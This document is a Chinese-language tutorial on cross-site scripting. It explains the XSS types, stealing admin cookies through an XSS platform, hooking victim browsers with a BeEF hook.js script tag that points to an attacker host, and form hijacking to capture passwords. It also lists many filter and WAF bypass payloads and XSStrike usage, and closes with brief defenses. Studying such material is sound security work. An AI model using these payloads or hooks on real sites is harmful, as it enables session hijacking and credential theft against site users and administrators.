# XSS跨站漏洞

**跨站脚本攻击是指攻击者往web页面插入恶意script代码，当用户浏览该页面时，嵌入其中web里面的script代码会被执行，从而达到恶意攻击用户的目的**

**XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以XSS漏洞关键就是寻找参数未过滤的输出函数**

![img](https://cdn.nlark.com/yuque/0/2021/png/1272951/1623812807110-92a87dfe-1e4e-4edf-9eec-37b470ff1e34.png?x-oss-process=image%2Fresize%2Cw_1078%2Climit_0)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629707398023-84cc1277-38d6-495a-96e6-e6a521e12fc3.png)





## 产生层面

**产生层面一般都是在前端，Javascript代码能干什么，执行后就会达到相应的效果**





## 函数类

php脚本的输出函数

常见的输出函数有：print，echo，print_r，printf，var_dump，var_export

- windows.alert()   弹出警告窗
- document.write()     将内容写到HTML文档中
- innerHTML   写入到HTML元素
- console.log       写入到浏览器的控制台

## 事件类

HTML 事件可以是浏览器行为，也可以是用户行为

| 事件        | 描述                                   |
| ----------- | -------------------------------------- |
| onchange    | HTML 元素改变                          |
| onclick     | 用户点击 HTML 元素                     |
| onmouseover | 用户在一个HTML元素上移动鼠标           |
| onmouseout  | 用户从一个HTML元素上移开鼠标           |
| onkeydown   | 用户按下键盘按键                       |
| onload      | 浏览器已完成页面的加载                 |
| onerror     | 出错时执行，用于故意构造错误时执行代码 |





## 危害影响

- 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号
- 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
- 盗窃企业重要的具有商业价值的资料
- 非法转账
- 强制发送电子邮件
- 网站挂马
- 控制受害者机器向其它网站发起攻击



## 浏览器内核版本

**利用这个漏洞需要浏览器版本和内核没有过滤XSS攻击**





## 常见出现场景

**文章发表，评论，留言，注册资料的地方，修改资料的地方**









# XSS跨站漏洞分类



## 反射型XSS

**<非持久化>   攻击者事先制作好攻击链接，需要欺骗用户去点击链接才能触发XSS代码(服务器中没有这样的页面和内容)，一般容易出现在搜索页面**

用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作




![在这里插入图片描述](https://img-blog.csdnimg.cn/20190522105651307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xheV9sb2dl,size_16,color_FFFFFF,t_70)





**反射型XSS不会存储用户的数据，仅发生在用户的一次访问过程之后，这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想法设法诱导用户点击链接**







## 存储型XSS

<持久化>代码是存储在服务器的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严那么这些代码将存储到服务器中，每当有用户访问该页面的时候都会触发代码执行，存储型XSS非常危险，容易造成蠕虫，大量盗窃Cookie，是三种XSS危害最大的一种





![在这里插入图片描述](https://img-blog.csdnimg.cn/20190522110656311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xheV9sb2dl,size_16,color_FFFFFF,t_70)





## DOM型

**基于文档对象模型的一种漏洞，DOM是一个与平台，编程无关的的接口，它允许程序或脚本动态的访问和更新文档内容，结构和样式，处理后的结果能成为显示页的一部分，DOM中有很多对象，其中一些是用户可以操纵的，如：url，location，refelter等，客户端的脚本程序可以通过DOM动态检查和修改页面内容，他不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS 漏洞如document.getElementByld(“x’).innerHTML、document.write)等**

\#' onclick="alert(2)">







# XSS 常规攻击手法

**平台，工具，结合其他等** 



**攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和http only，对方要触发这个漏洞地址**

**cookie session** 

用户凭据：通过凭据可以判断对方身份信息 



cookie 存储本地 存活时间较长 小中型 



session 会话 存储服务器 存活时间较短 大型



session会占用服务器的资源，但是比较安全。比如说javaweb中的session序列化和反序列化。

 

# XSS平台使用

[wordpress博客插件功能页 (xss8.cc)](https://xss8.cc/)

创建一个我的项目

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629713523744-ccaa413a-0f5e-4c2c-a96b-506364122005.png)

1. 选择自己需要的功能，打钩



![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629713588122-f6f4fb06-3b68-401b-8468-bd6e78f5c893.png)



1. 查看代码

![img](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629713862337-d03b82b2-8f2b-494b-9878-9ee6821dd2ad.png?x-oss-process=image%2Fresize%2Cw_890%2Climit_0)



1. 把这些跨站代码弄到目标攻击的网站，如留言板，反馈板，订单页

![img](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629713757661-13cbce4a-2f0f-4321-9835-742db1e8e323.png?x-oss-process=image%2Fresize%2Cw_531%2Climit_0)







![image-20220320145452064](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320145452064.png)











等对方管理员查看后台留言板或订单页的时候

![image-20220320145543014](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320145543014.png)



![img](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629713781110-9130ed07-3516-4ec6-9d86-c0df4f22e978.png?x-oss-process=image%2Fresize%2Cw_1059%2Climit_0)



1. 发现请求了这个地址。在平台上就有信息了





![image.png](https://cdn.nlark.com/yuque/0/2021/png/22078880/1629713805782-ed43bbaa-bfee-4b46-b5bc-79dcfd270d38.png?x-oss-process=image%2Fresize%2Cw_904%2Climit_0)









**利用获取到的Cookie使用Postman工具连接到对方后台网站**



![image-20220320145253735](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320145253735.png)





![image-20220320145352407](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320145352407.png)



------



# Beef使用教程

**beef-xss启动beef**

![image-20220320164321690](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320164321690.png)



打开beff网页，登录

![image-20220320164432972](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320164432972.png)





![image-20220320164538192](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320164538192.png)



复制上面启动beef的js语句<script src="http://127.0.0.1:3000/hook.js"></script>

地址要改为虚拟机的ip，<script src="http://10.1.16.8:3000/hook.js"></script>



插入到有XSS漏洞的界面



![image-20220320164748733](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320164748733.png)

对方查看后台后，beef自动生成一个可操控的shell



![image-20220320164853512](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320164853512.png)



连接成功后，我们可以使用beef盗取该用户的cookie，html源码，各种调用等，

如下我们盗取cookie



![image-20220320165021529](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320165021529.png)



可以看到界面有一个Get Cookie

![image-20220320165046401](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320165046401.png)



点击Execute即可获取cookie

![image-20220320165225552](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320165225552.png)



还有跳转页等其他功能

![image-20220320165327567](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220320165327567.png)



**还有很多其他攻击模块，具体请百度**







# HttpOnly属性

(只是限制了Cookie被盗取)

如歌在Cookie中设置了HttpOnly属性，那么**通过js脚本将无法读取到Cookie信息**，这样能有效防止XSS攻击，但并不能防止XSS漏洞只能是防止Cookie被盗取



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523190228525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDI1MjkwNA==,size_16,color_FFFFFF,t_70)



**使用xss盗取的cookie为空**



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523190556757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDI1MjkwNA==,size_16,color_FFFFFF,t_70)





## HttpOnly绕过

**浏览器未保存密码：需要XSS漏洞点在登录页面，利用表单劫持**

**浏览器保存账号密码：产生在后台的XSS，存储型XSS如留言等，浏览器读取账号密码**



## 表单劫持(没有保存密码)

通过XSS平台的表单劫持模块，填写目标表单所对应的属性



![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523191503174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDI1MjkwNA==,size_16,color_FFFFFF,t_70)



**对方点击登录的时候输入的明文密码即可在XSS平台获取**



------



# XSS绕过方式

## 输入参数无过滤

payload

```js
<script>alert(/xss/)</script>
```



## 标签闭合

payload

```js
"><script>alert(/xss/)</script>  // 双引号闭合value的双引号，> 闭合input标签
```



## <>实体编码

对`<>`进行了过滤

payload

1）构造标签事件

```js
'οnclick='alert(/xss/)  // 第一个引号闭合value，第二个引号原有后面的引号
```

2）构造事件onmouseover，javascript:伪协议

```js
'οnmοuseοver='javascript:alert(/xss/)
```





## <>替换为空

1）构造onclick事件

payload

```js
"οnclick="alert(/xss/)
```

2）构造事件onmouseover，javascript:伪协议

```js
'οnmοuseοver='javascript:alert(/xss/)
```





## script过滤

对script进行了过滤，利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议，`"><a href='javascript:alert(1)'>`,没有对javascript进行过滤，触发xss

payload

```js
"><a href='javascript:alert(1)'>
```







## 大小写混写

payload

```js
"ONCLICK="alert(/xss/)
```





## 关键字双写

payload

```js
"> <a hrhrefef='javascriscriptpt:alert(/xss/)'>
```





## 编码绕过

利用工具将javascript:alert(/xss/)语句进行编码

```js
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x2f;&#x78;&#x73;&#x73;&#x2f;&#x29;
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201204113417614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)



## 编码+检查字段绕过

输入内容中必须包含`http://`

payload

```js
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x2f;&#x78;&#x73;&#x73;&#x2f;&#x29;//http://www.baidu.com       // 注释后面的内容
```





## 隐藏表单



![在这里插入图片描述](https://img-blog.csdnimg.cn/20201204144230632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)







![在这里插入图片描述](https://img-blog.csdnimg.cn/20201204144435852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)



过滤了尖括号，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议



![在这里插入图片描述](https://img-blog.csdnimg.cn/20201204145358718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)

t_sort变量返回在了html的value属性中，尝试绕过

payload

```js
"type="text" οnclick="alert(1)"
```



## referer绕过



![在这里插入图片描述](https://img-blog.csdnimg.cn/2020120415071064.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)





![image-20220321185340450](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220321185340450.png)



payload

```js
" type="text" οnclick="alert(1)"
```





## user-agent绕过



![在这里插入图片描述](https://img-blog.csdnimg.cn/20201204153108559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)







![image-20220321185512728](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220321185512728.png)



payload

```js
" type="text" οnclick="alert(1)"
```





## cookie绕过



![在这里插入图片描述](https://img-blog.csdnimg.cn/20201204160501518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzMjIzMg==,size_16,color_FFFFFF,t_70)







![image-20220321185637436](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220321185637436.png)







## %0a换行符绕过

采用换行符%0a进行绕过,触发xss。

payload

```js
<a%0atype="text"%0aonclick="alert(111)">
```





## 支持swf 闭合标签

payload

```
level17.php?arg01=a&arg02="> onmouseover=alert()
```





------



# WAF绕过思路

**标签语法替换**

**特殊符号干扰**

**提交方式更改**

**垃圾数据溢出**

**加密解密算法**

**结合其他漏洞绕过**



## 常见waf过滤的标签

```
<script>  <a>  <p>  <img>  <body> <button>  <var>  <div>  <iframe>  <object> <input> 
<textarea>  <keygen> <frameset>  <embed>  <svg>  <math>  <video>  <audio> <select>
```





绕过方法：

```
可以弹窗的：alert，prompt ，confirm，base64加密，编码绕过（安全狗都没有过滤）

绕过方法有很多比如：

大小写绕过
javascript伪协议
没有分号
Flash
HTML5 新标签
Fuzz进行测试
双层标签绕过
```





# XSSfuzz在线工具

**该工具可以自动生成测试代码**

[fuzz](https://xssfuzzer.com/fuzzer.html)

![image-20220321211304871](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220321211304871.png)



![image-20220321211419788](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220321211419788.png)



# 自动化工具XSStrike

[xsstrike使用教程](https://blog.csdn.net/lady_killer9/article/details/109105084)

XSStrike 主要特点反射和 DOM XSS 扫描
多线程爬虫
Context 分析
可配置的核心
检测和规避 WAF
老旧的 JS 库扫描
智能 payload 生成器
手工制作的 HTML & JavaScript 解析器
强大的 fuzzing 引擎
盲打 XSS 支持
高效的工作流
完整的 HTTP 支持
Bruteforce payloads 支持
Payload 编码

```
-h, --help 			//显示帮助信息
-u, --url 			//指定目标 URL
--data 					//POST 方式提交内容
-v, --verbose 	//详细输出
-f, --file 			//加载自定义 paload 字典
-t, --threads 	//定义线程数
-l, --level 		//爬行深度
-t, --encode 		//定义 payload 编码方式
--json 					//将 POST 数据视为 JSON
--path 					//测试 URL 路径组件
--seeds 				//从文件中测试、抓取 URL
--fuzzer 				//测试过滤器和 Web 应用程序防火墙。
--update 				//更新
--timeout 			//设置超时时间
--params 				//指定参数
--crawl 				//爬行
--proxy 				//使用代理
--blind 				//盲测试
--skip 					//跳过确认提示
--skip-dom 			//跳过 DOM 扫描
--headers 			//提供 HTTP 标头
-d, --delay 		//设置延迟
```





![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628687047436-f08e74ab-b015-4aef-83f7-78f4998681ee.png)

**简单的探针绕过**

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628687240408-b3630938-971e-46fb-be7a-91445e4c41ec.png)







# XSS防御以及修复方案

- 为cookie设置httponly
- 输入过滤：对用户的输入**进行合理的验证**，对特殊字符（如<、>、'、"等）以及<script>、javascript等进行过滤
- 输出处理：对数据输出HTML上下文中不同位置进行恰当的**输出编码**。如：“ < ” 进行输出编码为 " &lt; " 等





